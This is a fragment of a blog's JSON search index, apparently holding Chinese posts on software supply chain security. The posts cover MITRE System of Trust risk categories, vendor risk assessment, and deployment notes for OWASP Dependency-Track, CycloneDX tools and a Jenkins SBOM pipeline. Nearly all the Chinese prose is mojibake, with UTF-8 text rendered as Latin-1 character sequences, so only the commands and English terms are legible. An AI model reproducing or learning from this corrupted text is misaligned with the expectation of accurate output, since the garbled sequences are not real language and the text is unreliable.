å…¶ä»–è´Ÿé¢å½±å“å¹¶å±å®³åˆ°å®¢æˆ·çš„é£é™©ã€‚\n\n\n\n\n\né£é™©ç±»åˆ«\nå®šä¹‰\n\n\n\nä»¿å†’\nä¸ä¾›åº”å“ï¼ˆäº§å“ï¼‰æˆ–æœåŠ¡çš„çœŸå®æ€§æœ‰å…³çš„é£é™©ã€‚\n\n\nå¥åº·åº¦\nå½±å“ä¾›åº”å“ï¼ˆäº§å“ï¼‰æˆ–æœåŠ¡æŒ‰é¢„æœŸæ‰§è¡Œèƒ½åŠ›çš„é£é™©ã€‚è¿™æ¶‰åŠä¸è´¨é‡ï¼Œå®‰å…¨æ€§ï¼Œæ¢å¤åŠ›ç­‰ç›¸å…³çš„ç‰¹å¾ã€‚\n\n\næ¶æ€§æ¼æ´\nä¸ä¾›åº”å“ï¼ˆäº§å“ï¼‰æˆ–æœåŠ¡çš„å®Œæ•´æ€§ç›¸å…³çš„é£é™©ã€‚\n\n\n\n\n\né£é™©ç±»åˆ«\nå®šä¹‰\n\n\n\næ‰€æä¾›æœåŠ¡çš„å®Œæ•´æ€§\nä¸æœåŠ¡åŸå°ä¸åŠ¨åœ°äº¤ä»˜ç›¸å…³çš„é£é™©ã€‚\n\n\næ‰€æä¾›æœåŠ¡çš„è´¨é‡\nä¸æŒ‰æŒ‡å®šäº¤ä»˜çš„æœåŠ¡ç›¸å…³çš„é£é™©ã€‚\n\n\næ‰€æä¾›æœåŠ¡çš„å¯é æ€§\nä¸æ‰€æä¾›æœåŠ¡çš„ä¸€è‡´æ€§ç›¸å…³çš„é£é™©ã€‚\n\n\næ‰€æä¾›æœåŠ¡çš„å®‰å…¨æ€§\nä¸åœ¨é¢å¯¹æ¶æ„æ“ä½œæ—¶æŒ‰é¢„æœŸäº¤ä»˜çš„æœåŠ¡ç›¸å…³çš„é£é™©ã€‚\n\n\nSoT BoKçš„çŸ¥è¯†å›¾è°±ç»“æ„å±•ç¤ºå¦‚ä¸‹ï¼š\nè½¯ä»¶ä¾›åº”å•†é£é™©ç®¡ç†æµç¨‹è½¯ä»¶ä¾›åº”å•†é£é™©æ˜¯æŒ‡ä¸ç¬¬ä¸‰æ–¹ä¾›åº”å•†ç›¸å…³çš„ä»»ä½•å¯èƒ½å½±å“ä¼ä¸šåˆ©ç›Šæˆ–èµ„äº§çš„å›ºæœ‰é£é™©ã€‚åœ¨é€‰æ‹©ç¬¬ä¸‰æ–¹è½¯ä»¶ä¾›åº”å•† æ—¶ï¼Œä¸ºäº†é¿å…å› å¼•å…¥ç¬¬ä¸‰æ–¹ä¾›åº”å•†è€Œå¸¦æ¥ä¼—å¤šæ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œéœ€è¦ç¨³å¥çš„æµç¨‹æ¥è¯†åˆ«å’Œç®¡ç†æ—¥ç›Šå¢åŠ çš„è½¯ä»¶ä¾› åº”å•†é£é™©ã€‚å› æ­¤ï¼Œä¼ä¸šäºŸéœ€æ„å»ºæœ‰æ•ˆä¸”ç¨³å¥çš„è½¯ä»¶ä¾›åº”å•†é£é™©ç®¡ç†æµç¨‹ã€‚Â \næ„å»ºå®Œæ•´çš„è½¯ä»¶ä¾›åº”å•†é£é™©ç®¡ç†æµç¨‹å¯ä»¥æé«˜è½¯ä»¶ä¾›åº”é“¾çš„é€æ˜åº¦ï¼ŒåŒæ—¶å¸®åŠ©ä¼ä¸šå®ç°é™ä½é‡‡è´­æˆæœ¬ã€è¯†åˆ«å’Œå‡ è½»ä¾›åº”å•†ç›¸å…³é£é™©ä»¥åŠå¯¹è½¯ä»¶ä¾›åº”å•†é£é™©ç®¡ç†ç³»ç»Ÿçš„æŒç»­ä¼˜åŒ–æ”¹è¿›ã€‚ä»¥ä¸‹æ˜¯é’ˆå¯¹è½¯ä»¶ä¾›åº”å•†åŸºæœ¬é£é™©ç®¡ç†æµç¨‹\n\næ ‡å‡†ç¡®ç«‹ï¼šç»“åˆä¼ä¸šçš„å®é™…æƒ…å†µï¼Œæ„å»ºè½¯ä»¶ä¾›åº”å•†è¯„ä¼°æ¨¡å‹ï¼Œåˆ¶å®šè½¯ä»¶ä¾›åº”å•†è€ƒæ ¸çš„è¯„ä¼°æ ‡å‡†åŠå®‰å…¨æ¡†æ¶ï¼›Â \n\nèµ„æ ¼è¯„ä¼°ï¼šæ ¹æ®åˆ¶å®šçš„è½¯ä»¶ä¾›åº”å•†è¯„ä¼°æ¨¡å‹å’Œç›¸å…³æ ‡å‡†ï¼Œå¯¹åˆæ­¥ç¬¦åˆè¦æ±‚çš„è½¯ä»¶ä¾›åº”å•†è¿›è¡Œå¤šç»´åº¦çš„ç»¼åˆæ€§èµ„æ ¼è¯„ä¼°ï¼Œé€‰å‡ºåŒ¹é…åº¦æœ€é«˜çš„ä¾›åº”å•†ï¼›Â \n\né£é™©è¯„ä¼°ï¼šå¯¹é€šè¿‡èµ„æ ¼è¯„ä¼°çš„è½¯ä»¶ä¾›åº”å•†è¿›è¡Œå®‰å…¨é£é™©è¯„ä¼°ï¼Œé’ˆå¯¹è½¯ä»¶ä¾›åº”å•†é¢ä¸´çš„æ½œåœ¨çš„å®‰å…¨é£é™©ã€å­˜åœ¨çš„å¼±ç‚¹ ä»¥åŠæœ‰å¯èƒ½é€ æˆçš„å½±å“ç»¼åˆåˆ†æå…¶å¯èƒ½å¸¦æ¥çš„å®‰å…¨é£é™©è¿›è¡Œè¯„ä¼°ï¼›Â \n\né£é™©ç›‘æ§ï¼šå¯¹è½¯ä»¶ä¾›åº”å•†å®æ–½é•¿æœŸæ€§çš„å®‰å…¨é£é™©ç›‘æ§ï¼ŒæŒç»­è¯†åˆ«å’Œç®¡ç†è½¯ä»¶ä¾›åº”å•†çš„å®‰å…¨é£é™©ï¼Œæ ¹æ®ç›‘æµ‹ç»“æœå®æ–½æ›´æ–°è½¯ä»¶ä¾›åº”å•†çš„é£é™©ç®¡ç†ç­–ç•¥ã€‚\n\n\nè½¯ä»¶ä¾›åº”å•†è¯„ä¼°æ¨¡å‹ä¸ºäº†ç¡®ä¿ä¼ä¸šå¯ä»¥æ‹¥æœ‰è¾ƒä¸ºç¨³å®šçš„ä¾›åº”é“¾ï¼Œæé«˜ä¼ä¸šçš„ç»¼åˆç«äº‰åŠ›ï¼Œç»è¿‡å¤šæ–¹é¢çš„ç»¼åˆè€ƒå¯Ÿåˆ†æï¼Œä»¥ä¸‹æ„å»ºäº†ä¸€ ä¸ªç³»ç»ŸåŒ–ã€ç»“æ„åŒ–çš„è½¯ä»¶ä¾›åº”å•†è¯„ä¼°æ¨¡å‹ä»¥ä¾›å‚è€ƒã€‚è½¯ä»¶ä¾›åº”å•†è¯„ä¼°æ¨¡å‹çš„å…³é”®æ„ä¹‰åœ¨äºä»ä¸åŒçš„ç»´åº¦å¯¹è½¯ä»¶ä¾› åº”å•†è¿›è¡Œè¯„ä¼°ï¼Œé€šè¿‡è€ƒå¯Ÿè½¯ä»¶ä¾›åº”å•†çš„ç»¼åˆå®åŠ›ï¼Œä»¥é€‰æ‹©æœ€åˆé€‚çš„åˆä½œä¼™ä¼´ã€‚ä»¥ä¸‹æ˜¯é€šè¿‡åäºŒç§ä¸åŒç»´åº¦å¯¹è½¯ä»¶ ä¾›åº”å•†è¯„ä¼°çš„å…¨è¿‡ç¨‹\n\nè´¢åŠ¡å®åŠ›ï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”å•†çš„è´¢åŠ¡èƒ½åŠ›ä»¥åŠç¨³å®šæ€§ï¼Œç¡®ä¿ä¾›åº”å•†å…·æœ‰ç¨³å®šæ€§å’Œå¯é æ€§æ¥æä¾›ä¸šåŠ¡æ‰€éœ€è¦çš„æœåŠ¡ï¼›Â \n\nè´¨é‡æ‰¿è¯ºï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”å•†çš„ç›¸å…³è½¯ä»¶äº§å“æ˜¯å¦ç¬¦åˆå›½å®¶åŠè¡Œä¸šæ ‡å‡†è¦æ±‚ï¼Œä¿¡æ¯å®‰å…¨å’Œæ•°æ®ä¿æŠ¤æ§åˆ¶æµç¨‹å¿…é¡»éµ å®ˆæ³•å¾‹ã€ç›‘ç®¡æˆ–åˆåŒä¹‰åŠ¡ä»¥åŠä»»ä½•è¡Œä¸šæ ‡å‡†çš„ä¿¡æ¯å®‰å…¨è¦æ±‚ï¼›Â \n\nä¼ä¸šèµ„è´¨ï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”é“¾ä¸Šçš„ç¬¬ä¸‰æ–¹ä¾›åº”å•†æ˜¯å¦èƒ½å¤Ÿæä¾›è½¯ä»¶å®‰å…¨å¼€å‘èƒ½åŠ›çš„ä¼ä¸šçº§èµ„è´¨ï¼Œæ˜¯å¦å…·å¤‡å›½é™…ã€å›½å®¶æˆ–è¡Œä¸šçš„å®‰å…¨å¼€å‘èµ„è´¨ï¼Œåœ¨è½¯ä»¶å®‰å…¨å¼€å‘çš„è¿‡ç¨‹ç®¡ç†ã€è´¨é‡ç®¡ç†ã€é…ç½®ç®¡ç†ã€äººå‘˜èƒ½åŠ›ç­‰æ–¹é¢æ˜¯å¦å…·å¤‡ä¸€å®šçš„ç»éªŒï¼Œå…·æœ‰æŠŠå®‰å…¨èå…¥è½¯ä»¶å¼€å‘è¿‡ç¨‹çš„èƒ½åŠ›ï¼›Â \n\næŠ€æœ¯å‚¨å¤‡ï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”å•†æ˜¯å¦æ‹¥æœ‰è‡ªä¸»ç ”å‘èƒ½åŠ›ä»¥åŠè‡ªä¸»æŠ€æœ¯çŸ¥è¯†äº§æƒï¼Œå¯¹ç§‘æŠ€çŸ¥è¯†æ˜¯å¦æœ‰è¿›è¡Œä¸æ–­çš„ç§¯ç´¯å’ŒåŠæ—¶æ›´æ–°ï¼Œå¯¹ä¼ä¸šæé«˜æŠ€æœ¯æ°´å¹³ã€ä¿ƒè¿›è½¯ä»¶ç”Ÿäº§å‘å±•æ˜¯å¦æœ‰å¼€å±•ä¸€ç³»åˆ—çš„æŠ€æœ¯ç ”ç©¶ï¼›Â \n\nåˆä½œèƒ½åŠ›ï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”å•†æ˜¯å¦æ‹¥æœ‰é«˜æ•ˆçš„æ²Ÿé€šæ¸ é“ä»¥åŠå…¨é¢çš„è§£å†³æ–¹æ¡ˆï¼Œæ‹¥æœ‰å…±åŒçš„ä»·å€¼è§‚å’Œå·¥ä½œç†å¿µæœ‰åŠ©äºå»ºç«‹é•¿æœŸçš„åˆä½œå…³ç³»ï¼›Â \n\nè½¯ä»¶äº¤ä»˜èƒ½åŠ›ï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”å•†åœ¨æ•´ä¸ªè½¯ä»¶åŠä¿¡æ¯æœåŠ¡äº¤ä»˜çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯å¦èƒ½æ»¡è¶³è½¯ä»¶æŒç»­æ€§äº¤ä»˜çš„è¦æ±‚ï¼›\n\nåº”æ€¥å“åº”èƒ½åŠ›ï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”å•†ä»è½¯ä»¶å¼€å‘åˆ°è¿è¥é˜¶æ®µæ˜¯å¦æŒç»­å®è¡Œå®æ—¶ç›‘æ§æœºåˆ¶ï¼Œæ˜¯å¦æœ‰åˆ©ç”¨é€‚å½“çš„ç½‘ç»œå’ŒåŸº äºç«¯ç‚¹çš„æ§åˆ¶æ¥æ”¶é›†ç”¨æˆ·æ´»åŠ¨ã€å¼‚å¸¸ã€æ•…éšœå’Œäº‹ä»¶çš„å®‰å…¨æ—¥å¿—ï¼Œæ˜¯å¦å…·æœ‰é€‚å½“çš„ä¸šåŠ¡è¿ç»­æ€§å’Œæ¢å¤èƒ½åŠ›ï¼Œä»¥é˜²æ­¢æˆ–å‡è½»ä¸šåŠ¡ä¸­æ–­å’Œç›¸å…³å½±å“ï¼›Â \n\næœåŠ¡èƒ½åŠ›ï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”å•†çš„å”®å‰æœåŠ¡èƒ½åŠ›ã€åŸ¹è®­æœåŠ¡èƒ½åŠ›ä»¥åŠå”®åç»´æŠ¤æœåŠ¡èƒ½åŠ›æ˜¯å¦æ»¡è¶³ä¼ä¸šçš„è¦æ±‚ï¼Œåœ¨åˆä½œ æœŸé—´å†…æ˜¯å¦å¯ä»¥å§‹ç»ˆå¦‚ä¸€çš„æä¾›é«˜æ°´å¹³çš„è´¨é‡å’ŒæœåŠ¡ï¼›\n\nåˆ›æ–°èƒ½åŠ›ï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”å•†çš„ç»¼åˆåˆ›æ–°èƒ½åŠ›ï¼ŒåŒ…æ‹¬æŠ€æœ¯åˆ›æ–°èƒ½åŠ›ã€ç ”ç©¶å¼€å‘èƒ½åŠ›ã€äº§å“åˆ›æ–°èƒ½åŠ›ä»¥åŠç”Ÿäº§åˆ›é€ åŠ›ç­‰ï¼›\n\nå†…éƒ¨ç®¡ç†èƒ½åŠ›ï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”å•†æ˜¯å¦æ‹¥æœ‰å®Œå–„çš„å†…éƒ¨ç®¡ç†åˆ¶åº¦æµç¨‹ã€æœ‰æ•ˆçš„é£é™©é˜²èŒƒæœºåˆ¶ä»¥åŠæ˜¯å¦å¯¹å‘˜å·¥å®šæœŸè¿›è¡Œå®‰å…¨åŸ¹è®­ç­‰ï¼Œå¯¹ä¾›åº”å•†å†…éƒ¨å®‰å…¨å¼€å‘æ ‡å‡†å’Œè§„èŒƒè¿›è¡Œå®¡æŸ¥ï¼Œè¦æ±‚å…¶èƒ½å¤Ÿå¯¹å¼€å‘è½¯ä»¶çš„ä¸åŒåº”ç”¨åœºæ™¯ã€ä¸åŒæ¶æ„è®¾è®¡ã€ä¸åŒå¼€å‘è¯­è¨€è¿›è¡Œè§„èŒƒçº¦æŸï¼Œå®¡æŸ¥è½¯ä»¶ä¾›åº”å•†å¯¹å…¶è‡ªèº«ä¿¡æ¯å®‰å…¨ä¿å¯†ç¨‹åº¦ï¼›Â \n\nè½¯ä»¶æˆæœ¬ï¼šè¯„ä¼°è½¯ä»¶ä¾›åº”å•†æ‰€æä¾›çš„è½¯ä»¶æˆæœ¬æ˜¯å¦å­˜åœ¨è™šæŠ¥ç­‰ç°è±¡ï¼Œå®¡æŸ¥äº§å“åŠç›¸å…³æœåŠ¡æ˜¯å¦å¯ä»¥æŒ‰ç…§åˆç†çš„ä»·æ ¼äº¤ä»˜ï¼›Â \n\nè½¯ä»¶é€‚ç”¨æ€§ï¼šè¯„ä¼°è½¯ä»¶åœ¨å¼€å‘éƒ¨ç½²ä»¥åŠåŠ¨æ€è¿è¡Œæ—¶çš„é€‚ç”¨æ€§ï¼Œæ˜¯å¦å¯ä»¥æŒç»­æ»¡è¶³æ–°çš„éœ€æ±‚ã€‚\n\n\nè½¯ä»¶ä¾›åº”å•†ç®¡ç†çš„ä½œç”¨é€šè¿‡å¯¹è½¯ä»¶ä¾›åº”å•†é£é™©ç®¡ç†æœ‰åŠ©äºä¼ä¸šæ›´åŠ é«˜æ•ˆå‡†ç¡®åœ°æ§åˆ¶è½¯ä»¶ä¾›åº”å•†å¸¦æ¥çš„æ–°çš„å®‰å…¨é£é™©ï¼Œä»¥ä¸‹æ˜¯è½¯ä»¶ä¾›åº”å•†é£é™©ç®¡ç†çš„å…·ä½“ä½œç”¨ï¼š-é™ä½é£é™©ï¼šé€šè¿‡å¯¹è½¯ä»¶ä¾›åº”å•†è¿›è¡Œå½»åº•çš„å®¡æŸ¥å¯ä»¥è¯†åˆ«å…¶å¯èƒ½å¯¹ä¸šåŠ¡æ„æˆçš„å®‰å…¨å¨èƒçš„ä»»ä½•æ½œåœ¨å¼±ç‚¹ï¼Œæ ¹æ®è½¯ä»¶ä¾›åº”å•†å¯¹ä¼ä¸šä¸šåŠ¡çš„å½±å“ç¡®å®šæ¼æ´çš„é‡è¦æ€§ï¼›Â \n\né™ä½æˆæœ¬ï¼šé€šè¿‡å¯¹è½¯ä»¶ä¾›åº”å•†é£é™©è¿›è¡Œå……åˆ†çš„è¯„ä¼°ï¼Œå¯ä»¥ä»¥ä¸»åŠ¨è€Œéè¢«åŠ¨çš„æ–¹å¼åº”å¯¹å®‰å…¨å¨èƒï¼Œå‡å°‘æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œé¿å…ç½‘ç»œå®‰å…¨æ”»å‡»æˆ–å…¶ä»–æ•°æ®æ³„éœ²ç­‰é—®é¢˜ç»™ä¼ä¸šé€ æˆçš„è´¢åŠ¡æŸå¤±ï¼›Â \n\næé«˜æ•ˆç‡ï¼šé€šè¿‡å¯¹è½¯ä»¶ä¾›åº”å•†è¿›è¡Œå®æ—¶é£é™©ç›‘æ§ï¼Œå¯ä»¥æå‰é¢„çŸ¥é£é™©å¹¶åŠæ—¶åšå‡ºå“åº”ï¼Œæé«˜ä¼ä¸šå¤„ç†å®‰å…¨é£é™©çš„ æ•ˆç‡ï¼›Â \n\nåŸ¹å…»é•¿æœŸåˆä½œå…³ç³»ï¼šé€šè¿‡å¯¹ä¾›åº”å•†é£é™©çš„ç®¡ç†ã€è¯„ä¼°å’Œè·Ÿè¸ªç›‘æ§ï¼ŒåŠ å¼ºå¯¹ä¾›åº”å•†å¥åº·çŠ¶å†µçš„ç›‘ç£ï¼Œæœ‰åŠ©äºåŸ¹å…»å¯é çš„é•¿æœŸåˆä½œå…³ç³»ã€‚\n\n\nReferences\nSystem of Trustâ„¢\nAddressing Supply Chain Security Risks: MITREâ€™s System of Trustâ„¢ | RSA Conference\n\n","slug":"ä¾›åº”é“¾å®‰å…¨å¯ä¿¡ç³»ç»ŸæŠ€æœ¯æ¡†æ¶","date":"2022-06-29T08:43:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,æŠ€æœ¯æ¡†æ¶","author_index":"Moses"},{"id":"afb19c047533022f884066f88b6a2608","title":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨åˆ†æå·¥å…·-Dependency-Track","content":"dependency-trackæ¦‚è¿°å’ŒèƒŒæ™¯[[SCAè½¯ä»¶æˆåˆ†åˆ†æå‰æœŸæ¢ç´¢#OWASP Dependency-Track]]\néƒ¨ç½²DTquick-start[[SCAè½¯ä»¶æˆåˆ†åˆ†æå‰æœŸæ¢ç´¢#éƒ¨ç½²]]dockerå®‰è£…ç‰ˆæœ¬ä¸ºV3.8.0\nK8Séƒ¨ç½²helm-chartså‰æœŸå‡†å¤‡ï¼šå®‰è£…SC\n\nå¿«é€Ÿä½¿ç”¨[[longhorn]]\n\nè®¾ç½®é»˜è®¤å­˜å‚¨ç±»\nkubectl patch storageclass longhorn -p &#39;&#123;&quot;metadata&quot;: &#123;&quot;annotations&quot;:&#123;&quot;storageclass.kubernetes.io&#x2F;is-default-class&quot;:&quot;true&quot;&#125;&#125;&#125;&#39;\nä½¿ç”¨Helm v3å®‰è£…\nhelm repo add evryfs-oss https:&#x2F;&#x2F;evryfs.github.io&#x2F;helm-charts&#x2F;\nhelm install dependency-track evryfs-oss&#x2F;dependency-track --namespace dependency-track --create-namespace\nåˆ›å»ºè·¯ç”±\n\né…ç½®config.json\n&#x2F;app&#x2F;static $ cat config.json\n&#123;\n  &quot;API_BASE_URL&quot;: &quot;http:&#x2F;&#x2F;dt-api.kubegems.io:32126&quot;,\n  &quot;OIDC_ISSUER&quot;: &quot;&quot;,\n  &quot;OIDC_CLIENT_ID&quot;: &quot;&quot;,\n  &quot;OIDC_SCOPE&quot;: &quot;openid profile email&quot;,\n  &quot;OIDC_FLOW&quot;: &quot;&quot;,\n  &quot;OIDC_LOGIN_BUTTON_TEXT&quot;: &quot;&quot;\n&#125;\næµ‹è¯•ç™»å½•-ä¿®æ”¹å¯†ç -åˆ›å»ºæµ‹è¯•é¡¹ç›®.æ¼æ´åˆ†æåŠä¾èµ–å›¾è°±å¦‚ä¸‹ï¼š\n\n\n\n\nä¸€æ®µäº‹ä»¶åbackendæœåŠ¡å‡ºç°è£…è½½å·å¤±è´¥(ä¹Ÿæœ‰å¯èƒ½æ˜¯CPUçš„é—®é¢˜)Dependency Track High CPU Behaviour Â· Issue #264 Â· DependencyTrack&#x2F;dependency-track Â· GitHubï¼Œå°è¯•å„ç§å›æ»šã€æ‰©å®¹ç­‰æ–¹å¼å¤±è´¥åé‡æ–°éƒ¨ç½²ï¼Œé‡æ–°éƒ¨ç½²å¯èƒ½æ˜¯Longhornçš„PVå·æœªåˆ é™¤å¯¼è‡´å®‰è£…å¤±è´¥ï¼Œä¸èƒ½åˆ›å»ºPVCã€‚ä¿®æ”¹valueæ–‡ä»¶åé‡æ–°å®‰è£…æˆåŠŸã€‚# ä¸‹è½½chart\nhelm fetch evryfs-oss&#x2F;dependency-track\n# è§£å‹\ntar -zxf dependency-track-1.4.0.tgz\n# ä¿®æ”¹value.yamlæ–‡ä»¶ï¼Œæ›´æ¢SCï¼Œä½¿ç”¨local-path\nvi value.yaml \n# ä¿®æ”¹postgresqlçš„éƒ¨ç½²æ–‡ä»¶ï¼Œæ›´æ¢sc,ä½¿ç”¨local-path\nvim deployment.yaml\n# é‡æ–°å®‰è£…\nhelm install -f values.yaml dependency-track . --namespace dependency-track --create-namespace\n\nDTæ›´æ¢æ•°æ®åº“Dependency-Trackæ›´æ¢æ•°æ®åº“æ–‡æ¡£é€‚ç”¨äºdockeréƒ¨ç½²ï¼ŒK8Sæš‚æœªç ”ç©¶\nSBOM[[è½¯ä»¶ç‰©æ–™æ¸…å•SBOM]]CycloneDXå·¥å…·CycloneDX Tool Center\ncdxgen\né¡¹ç›®åœ°å€cdxgen\nå®˜ç½‘Scan docs\n\nå®‰è£…æµ‹è¯•xfxj01@moses î‚° ~&#x2F;Downloads î‚° nvm install v16.15.1\nxfxj01@moses î‚° ~&#x2F;Downloads î‚° npm install -g @appthreat&#x2F;cdxgen\n\nä½¿ç”¨åœºæ™¯ä½¿ç”¨åœºæ™¯å’Œæ›´å¤šçš„åŠŸèƒ½ä¸ºæ·±å…¥ç ”ç©¶ï¼Œè¯¦è§å®˜ç½‘\nCycloneDX Maven Pluginåœ¨é¡¹ç›®pomæ–‡ä»¶çš„pluginä¸­å¼•å…¥\n&lt;plugin&gt;\n\t\t\t\t&lt;groupId&gt;org.cyclonedx&lt;&#x2F;groupId&gt;\n\t\t\t\t&lt;artifactId&gt;cyclonedx-maven-plugin&lt;&#x2F;artifactId&gt;\n\t\t\t\t&lt;version&gt;2.5.1&lt;&#x2F;version&gt;\n\t\t\t\t&lt;executions&gt;\n\t\t\t\t\t&lt;execution&gt;\n\t\t\t\t\t\t&lt;phase&gt;package&lt;&#x2F;phase&gt;\n\t\t\t\t\t\t&lt;goals&gt;\n\t\t\t\t\t\t\t&lt;goal&gt;makeAggregateBom&lt;&#x2F;goal&gt;\n\t\t\t\t\t\t&lt;&#x2F;goals&gt;\n\t\t\t\t\t&lt;&#x2F;execution&gt;\n\t\t\t\t&lt;&#x2F;executions&gt;\n\t\t\t\t&lt;configuration&gt;\n\t\t\t\t\t&lt;projectType&gt;library&lt;&#x2F;projectType&gt;\n\t\t\t\t\t&lt;schemaVersion&gt;1.3&lt;&#x2F;schemaVersion&gt;\n\n\t\t\t\t\t&lt;includeBomSerialNumber&gt;true&lt;&#x2F;includeBomSerialNumber&gt;\n\n\t\t\t\t\t&lt;includeCompileScope&gt;true&lt;&#x2F;includeCompileScope&gt;\n\n\t\t\t\t\t&lt;includeProvidedScope&gt;true&lt;&#x2F;includeProvidedScope&gt;\n\n\t\t\t\t\t&lt;includeRuntimeScope&gt;true&lt;&#x2F;includeRuntimeScope&gt;\n\n\t\t\t\t\t&lt;includeSystemScope&gt;true&lt;&#x2F;includeSystemScope&gt;\n\n\t\t\t\t\t&lt;includeTestScope&gt;false&lt;&#x2F;includeTestScope&gt;\n\n\t\t\t\t\t&lt;includeLicenseText&gt;false&lt;&#x2F;includeLicenseText&gt;\n\n\t\t\t\t\t&lt;outputFormat&gt;all&lt;&#x2F;outputFormat&gt;\n\n\t\t\t\t\t&lt;outputName&gt;bom&lt;&#x2F;outputName&gt;\n\n\t\t\t\t&lt;&#x2F;configuration&gt;\n\n\t\t\t&lt;&#x2F;plugin&gt;\n\nCycloneDX BOMs RepoDTä¸æ”¯æŒå­˜å‚¨åŸå§‹BOMæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨BOM Repoè¿›è¡Œå­˜å‚¨cyclonedx-bom-repo-serverä½¿ç”¨dockeréƒ¨ç½²\n# æœ¬åœ°æµ‹è¯•\ndocker run --env REPO__DIRECTORY&#x3D;&#x2F;repo --env ALLOWEDMETHODS__GET&#x3D;&quot;true&quot; --env ALLOWEDMETHODS__POST&#x3D;&quot;true&quot; --env ALLOWEDMETHODS__DELETE&#x3D;&quot;true&quot; --tty --interactive -p 8000:8080 cyclonedx&#x2F;cyclonedx-bom-repo-server\n# æŒä¹…åŒ–å­˜å‚¨\nmkdir repo\ndocker run --volume &quot;$(pwd)&#x2F;repo&quot;:&#x2F;repo --env REPO__DIRECTORY&#x3D;&#x2F;repo --env ALLOWEDMETHODS__GET&#x3D;&quot;true&quot; --env ALLOWEDMETHODS__POST&#x3D;&quot;true&quot; --env ALLOWEDMETHODS__DELETE&#x3D;&quot;true&quot; --tty --interactive -p 8000:8080 cyclonedx&#x2F;cyclonedx-bom-repo-server\n\nå®‰è£…Jenkinsæµ‹è¯•ç¯å¢ƒdocker run -d -p 8222:8080 -u root  -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock jenkinsci&#x2F;blueocean:latest\n# åˆå§‹å¯†ç \ncat &#x2F;var&#x2F;jenkins_home&#x2F;secrets&#x2F;initialAdminPassword\nå®‰è£…CI&#x2F;CDæ’ä»¶\nå®‰è£…OWASP Dependency-Trackæ’ä»¶\n\nç³»ç»Ÿé…ç½®\n\né…ç½®mavenåŠJDKç¯å¢ƒå˜é‡\n\nbuildæµ‹è¯•\ncd hctc-auditor-message-master-42d51509695f2e19d602bfed846d71b052151176\n# æ‰“åŒ…\nmvn clean install -D mvn.test.skip&#x3D;true\n# ç”Ÿæˆbom.xmlæ–‡ä»¶\nmvn org.cyclonedx:cyclonedx-maven-plugin:makeBom\n\n\næ„å»ºåæ“ä½œ\n\n\n\nåœ¨ã€Buildã€‘å¤„é€‰æ‹©â€œExecute Shellâ€ï¼Œç„¶åè¾“å…¥æ„å»ºè¯­å¥ï¼Œå¹¶æ·»åŠ mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBomç”Ÿæˆsbomæ–‡ä»¶\nåœ¨ã€Post-build Actionsã€‘å¤„é€‰æ‹©â€œPublish BOM to Dependency-Trackâ€,å¡«å†™project name å’Œ project versionï¼Œåœ¨â€œArtifactâ€å¤„è¾“å…¥$&#123;WORKSPACE&#125;/target/bom.json\n\n\næµ‹è¯•ç»“æœæµ‹è¯•è¿‡ç¨‹å…ˆåœ¨DTä¸­åˆ›å»ºçš„é¡¹ç›®ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½è‡ªåŠ¨åˆ›å»º\næµ‹è¯•pipelineé¡¹ç›®-åˆ›å»ºAPI1.é¦–å…ˆåœ¨Dependency-Trackä¸­ç‚¹å‡»ã€Administrationã€‘-&gt; ã€Access Managementã€‘-&gt;ã€Teamsã€‘,åˆ›å»ºä¸€ä¸ªTeamå¹¶è®°å½•å…¶API Keyã€‚\n2.API Key æ·»åŠ PROJECT_CREATION_UPLOADæƒé™\npipeline scriptpipeline &#123;\n    agent any\n    stages &#123;\n        stage(&#39;Start&#39;) &#123;\n           steps &#123;\n               echo &#39;Hello World&#39;\n           &#125;\n       &#125;\n       stage(&#39;Build&#39;) &#123;\n           steps &#123;\n                git &#39;https:&#x2F;&#x2F;github.com&#x2F;sohutv&#x2F;cachecloud.git&#39;\n                sh &quot;mvn -DskipTests&#x3D;true clean package&quot;\n            &#125;\n       &#125;\n        stage(&#39;Generating SBOM with Cyclonedx&#39;) &#123;\n            steps &#123;\n                sh &#39;mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom&#39;\n            &#125;\n        &#125;\n        stage(&#39;dependencyTrackPublisher&#39;) &#123;\n            steps &#123;\n                withCredentials([string(credentialsId: &#39;dt&#39;, variable: &#39;API_KEY&#39;)]) &#123;\n                    dependencyTrackPublisher artifact: &#39;target&#x2F;bom.xml&#39;, projectId: &#39;534a7d70-c510-4770-8796-2abdac6f55d7&#39;,  autoCreateProjects: true, dependencyTrackApiKey:API_KEY, synchronous: false\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n&#125;\nå‚è€ƒ OWASP Dependency-Track Plugin\né—®é¢˜ ä½¿ç”¨projectNameå’ŒprojectVersionåˆ›å»ºæµæ°´çº¿å¤±è´¥ERROR: Either the projectId or the projectName and projectVersion have to be specifiedissue\n\n\nDependency-Track Jenkins Plugin Handling of Project Deletion in DT Server\nAuto-Create Projects doesnâ€™t work - 3.6.1 VersionprojectName and projectVersion are already properties that get saved. For freestyle builds, it forces the use of projectId and will only record that, but for pipeline jobs you get the option to specify either the projectId or the projectName + projectVersion.\n\nHowever, projectName + projectVersion currently doesn&#39;t support synchronous publishing mode due to API limitations in DT.\n\n\nè§£å†³é—®é¢˜10\n\n\nå¢åŠ API token 